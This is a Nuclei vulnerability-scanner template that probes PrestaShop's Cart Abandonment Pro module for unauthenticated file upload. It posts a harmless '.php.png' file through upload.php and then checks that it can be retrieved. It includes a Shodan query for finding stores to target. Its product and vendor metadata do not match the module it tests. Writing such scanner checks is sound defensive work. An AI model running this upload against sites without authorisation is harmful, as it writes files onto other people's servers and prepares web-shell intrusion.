flow: http(1) && http(2)
http:
- extractors:
  - internal: true
    name: matched_path
    part: request
    regex:
    - \/modules\/([^\/]+)\/
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(content_type, "text/html")
    - contains(body, "{{filename}}.php.png")
    - status_code == 200
    internal: true
    type: dsl
  payloads:
    paths:
    - cartabandonmentpro
    - cartabandonmentproOld
    - cartabandonmentpro_Old
    - cartabandonmentpro2
    - pscartabandonmentpro
  raw:
  - 'POST /modules/{{paths}}/upload.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=xYzZY


    --xYzZY

    Content-Disposition: form-data; name="image"; filename="{{filename}}.php.png"

    Content-Type: image/png


    <html>

    <!-- {{string}} -->

    </html>


    --xYzZY--

    '
  stop-at-first-match: true
- matchers:
  - condition: and
    dsl:
    - contains(content_type, "image/png")
    - contains(body, "{{string}}")
    - status_code == 200
    type: dsl
  raw:
  - 'GET {{matched_path}}uploads/{{filename}}.php.png HTTP/1.1

    Host: {{Hostname}}

    '
id: prestashop-cartabandonmentpro-file-upload
info:
  author: MaStErChO
  metadata:
    framework: prestashop
    max-request: 2
    product: ap_pagebuilder
    shodan-query: http.component:"prestashop"
    vendor: apollotheme
    verified: true
  name: Prestashop Cart Abandonment Pro File Upload
  reference:
  - https://www.openservis.cz/prestashop-blog/nejcastejsi-utoky-v-roce-2023-seznam-deravych-modulu-nemate-nejaky-z-nich-na-e-shopu-i-vy/
  - https://dh42.com/blog/prestashop-security/
  severity: critical
  tags: intrusive,file-upload,cartabandonmentpro,prestashop,vuln
variables:
  filename: '{{rand_base(7, "abc")}}'
  string: '{{rand_base(7, "abc")}}'
